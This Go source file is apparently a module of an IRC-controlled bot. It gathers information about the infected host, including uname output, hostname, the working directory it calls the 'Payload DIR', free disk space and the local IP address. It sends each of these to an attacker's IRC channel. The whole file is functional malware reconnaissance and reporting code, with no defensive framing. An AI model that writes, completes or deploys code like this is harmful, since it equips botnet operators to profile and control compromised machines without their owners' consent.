package pkg

import (
	"fmt"
	"net"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

type botinfo struct {
	sys, hn, pd, fds, lip string
}

func freeDiskSpace(hw string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(hw, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024 //B to GB Formula
}

func getLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:22")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	ip := conn.LocalAddr().String()
	return ip, nil
}

func sysInfo() string {
	cmd, _ := exec.Command("uname", "-a").Output()
	return string(cmd)
}

func ReportInf(reportIRC net.Conn, set_chan string) {
	hName, _ := os.Hostname()
	pDir, _ := os.Getwd()

	hw := &pDir
	nbotinfo := botinfo{
		sys: sysInfo(),
		hn:  hName,
		pd:  pDir,
		fds: fmt.Sprint(freeDiskSpace(*hw)),
		lip: fmt.Sprint(getLocalIP()),
	}

	IRC_Report(reportIRC, set_chan, "System Info: "+nbotinfo.sys)
	IRC_Report(reportIRC, set_chan, "Host Name: "+nbotinfo.hn)
	IRC_Report(reportIRC, set_chan, "Payload DIR: "+nbotinfo.pd)
	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+nbotinfo.fds)
	IRC_Report(reportIRC, set_chan, "Local IP: "+nbotinfo.lip)
}
